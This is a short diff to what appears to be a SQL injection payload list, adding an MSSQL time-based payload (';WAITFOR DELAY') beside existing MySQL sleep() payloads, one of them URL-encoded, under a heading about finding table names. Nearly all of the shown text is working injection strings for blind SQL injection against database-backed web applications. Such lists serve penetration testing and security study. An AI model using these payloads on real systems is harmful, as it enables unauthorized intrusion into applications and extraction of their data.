@@ -68,7 +68,7 @@ Finding the table name
 Time-Based:
 ,(select * from (select(sleep(10)))a)
 %2c(select%20*%20from%20(select(sleep(10)))a)
-
+';WAITFOR DELAY '0:0:30'--
 
 Comments:
 
